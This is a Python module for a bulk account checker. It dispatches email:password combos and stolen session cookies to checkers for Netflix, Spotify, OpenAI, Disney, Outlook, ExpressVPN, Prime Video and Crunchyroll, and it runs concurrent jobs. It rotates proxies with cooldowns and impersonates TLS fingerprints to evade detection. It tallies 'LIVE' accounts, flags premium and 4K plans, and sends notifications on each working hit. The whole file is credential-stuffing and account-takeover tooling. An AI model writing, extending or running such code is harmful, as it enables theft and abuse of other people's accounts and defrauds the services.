import concurrent.futures
import logging
import threading
import time
from datetime import datetime

from checkers.crunchyroll import check_crunchyroll_account, check_crunchyroll_cookie
from checkers.disney import check_disney_account, check_disney_cookie
from checkers.expressvpn import check_expressvpn_account
from checkers.netflix import check_netflix_membership
from checkers.openai import check_openai_cookie
from checkers.outlook import check_outlook_account
from checkers.primevideo import check_primevideo_cookie
from checkers.spotify import check_spotify_cookie
from modules.db import save_history
from modules.notifications import dispatch_bulk_notification, dispatch_live_notification
from modules.proxy_manager import get_random_proxy, mark_proxy_cooldown
from modules.sse import broadcast_sse
from modules.tls_engine import create_tls_session

_jobs_lock = threading.Lock()
_jobs = {}  # job_id -> dict state


def _check_item_dispatch(service, item, use_proxy=True):
    svc = (service or "netflix").lower().strip()
    raw = item.strip() if isinstance(item, str) else str(item)

    if svc == "netflix":
        return check_netflix_membership(raw, use_proxy=use_proxy)
    elif svc == "spotify":
        return check_spotify_cookie(raw, use_proxy=use_proxy)
    elif svc == "openai":
        return check_openai_cookie(raw, use_proxy=use_proxy)
    elif svc == "crunchyroll":
        if ":" in raw[:100] and not raw.startswith("{"):
            parts = raw.split(":", 1)
            return check_crunchyroll_account(
                parts[0].strip(), parts[1].strip(), use_proxy=use_proxy
            )
        return check_crunchyroll_cookie(raw, use_proxy=use_proxy)
    elif svc == "disney":
        if ":" in raw[:100] and not raw.startswith("{"):
            parts = raw.split(":", 1)
            return check_disney_account(
                parts[0].strip(), parts[1].strip(), use_proxy=use_proxy
            )
        return check_disney_cookie(raw, use_proxy=use_proxy)
    elif svc in ("outlook", "hotmail"):
        parts = raw.split(":", 1)
        if len(parts) == 2:
            return check_outlook_account(
                parts[0].strip(), parts[1].strip(), use_proxy=use_proxy
            )
        return {"status": "ERROR", "error": "Invalid email:password format"}
    elif svc == "expressvpn":
        parts = raw.split(":", 1)
        if len(parts) == 2:

            def _evpn_prx():
                prx, label, raw_p = get_random_proxy()
                return (
                    (prx.get("http") or prx.get("https")) if prx else None
                )

            return check_expressvpn_account(
                parts[0].strip(),
                parts[1].strip(),
                use_proxy=use_proxy,
                get_proxy_fn=_evpn_prx,
                save_history_fn=save_history,
            )
        return {"status": "ERROR", "error": "Invalid email:password format"}
    elif svc == "primevideo":
        return check_primevideo_cookie(
            raw,
            use_proxy=use_proxy,
            get_proxy_fn=get_random_proxy,
            cooldown_fn=mark_proxy_cooldown,
            save_fn=save_history,
            session_fn=lambda: create_tls_session(impersonate="primevideo"),
        )
    return check_netflix_membership(raw, use_proxy=use_proxy)


def start_batch_job(
    service, items, use_proxy=True, concurrency=3, send_notif=True
):
    if not items:
        return None, "No items provided"

    job_id = f"job_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{int(time.time() * 1000) % 10000}"
    state = {
        "job_id": job_id,
        "service": service or "universal",
        "total": len(items),
        "completed": 0,
        "live": 0,
        "dead": 0,
        "hold": 0,
        "four_k": 0,
        "status": "RUNNING",  # RUNNING, STOPPED, FINISHED, ERROR
        "created_at": time.time(),
        "updated_at": time.time(),
        "stop_requested": False,
        "results": [],
        "live_accounts": [],
    }

    with _jobs_lock:
        _jobs[job_id] = state

    def _job_worker():
        t0 = time.time()
        c_limit = max(1, min(int(concurrency), 10))

        def _process_one(idx_item):
            idx, item = idx_item
            if state["stop_requested"]:
                return None
            try:
                res = _check_item_dispatch(
                    state["service"], item, use_proxy=use_proxy
                )
            except Exception as ex:
                res = {"status": "ERROR", "error": str(ex)}

            st = res.get("status", "ERROR")
            plan = res.get("plan", "") or res.get("product", "")

            with _jobs_lock:
                state["completed"] += 1
                state["updated_at"] = time.time()
                is_live = st in ("LIVE", "OK")
                if is_live:
                    state["live"] += 1
                    if any(
                        k in plan.upper() for k in ("4K", "ULTRA", "PREMIUM")
                    ):
                        state["four_k"] += 1
                    acc_info = res.get("email") or item[:60]
                    state["live_accounts"].append(f"{acc_info} [{plan}]")
                elif st in ("HOLD", "FREE"):
                    state["hold"] += 1
                else:
                    state["dead"] += 1

                record = {
                    "index": state["completed"],
                    "item": (
                        item[:100] + "..." if len(item) > 100 else item
                    ),
                    "status": st,
                    "plan": plan,
                    "country": res.get("country", ""),
                    "email": res.get("email", ""),
                }
                state["results"].append(record)

            broadcast_sse(
                "job_progress",
                {
                    "job_id": job_id,
                    "completed": state["completed"],
                    "total": state["total"],
                    "live": state["live"],
                    "dead": state["dead"],
                    "hold": state["hold"],
                    "latest": record,
                },
                session_id=job_id,
            )

            if is_live:
                try:
                    dispatch_live_notification(
                        res, item, state["service"]
                    )
                except Exception as ex_n:
                    logging.debug(f"Live notif error: {ex_n}")

            return res

        try:
            indexed_items = list(enumerate(items))
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=c_limit
            ) as pool:
                list(pool.map(_process_one, indexed_items))
        except Exception as e:
            logging.error(f"Job {job_id} exception: {e}")

        dur_sec = max(1, int(time.time() - t0))
        dur_str = f"{dur_sec // 60}m {dur_sec % 60}s"

        with _jobs_lock:
            state["status"] = (
                "STOPPED" if state["stop_requested"] else "FINISHED"
            )
            state["updated_at"] = time.time()
            state["duration"] = dur_str

        broadcast_sse(
            "job_finished",
            {
                "job_id": job_id,
                "status": state["status"],
                "total": state["total"],
                "live": state["live"],
                "dead": state["dead"],
                "hold": state["hold"],
                "duration": dur_str,
            },
            session_id=job_id,
        )

        if send_notif:
            try:
                summary = {
                    "total": state["total"],
                    "live": state["live"],
                    "four_k": state["four_k"],
                    "hold": state["hold"],
                    "dead": state["dead"],
                    "duration": dur_str,
                }
                dispatch_bulk_notification(summary)
            except Exception as ex_b:
                logging.debug(f"Bulk notif error: {ex_b}")

    t = threading.Thread(target=_job_worker, daemon=True)
    t.start()
    return job_id, None


def get_job_state(job_id):
    with _jobs_lock:
        j = _jobs.get(job_id)
        if not j:
            return None
        return dict(j)


def stop_batch_job(job_id):
    with _jobs_lock:
        j = _jobs.get(job_id)
        if not j:
            return False
        j["stop_requested"] = True
        j["status"] = "STOPPED"
        return True


def list_recent_jobs(limit=10):
    with _jobs_lock:
        items = list(_jobs.values())
    items.sort(key=lambda x: x.get("created_at", 0), reverse=True)
    return items[:limit]
